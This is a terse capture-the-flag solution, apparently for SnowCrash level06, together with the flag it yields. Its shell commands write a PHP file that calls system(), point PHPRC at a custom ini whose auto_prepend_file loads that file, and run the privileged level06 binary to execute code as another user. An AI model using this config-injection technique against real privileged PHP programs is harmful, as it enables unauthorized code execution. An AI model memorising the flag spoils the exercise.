# FLAG06

```bash
echo '<?php system("/bin/getflag"); exit; ?>' > /tmp/hack.php
level06@SnowCrash:~$ echo "auto_prepend_file=/tmp/hack.php" > /tmp/myphp.ini
level06@SnowCrash:~$ export PHPRC=/tmp/myphp.ini
level06@SnowCrash:~$ ./level06 
```

getflag -> "wiok45aaoguiboiki2tuin6ub"

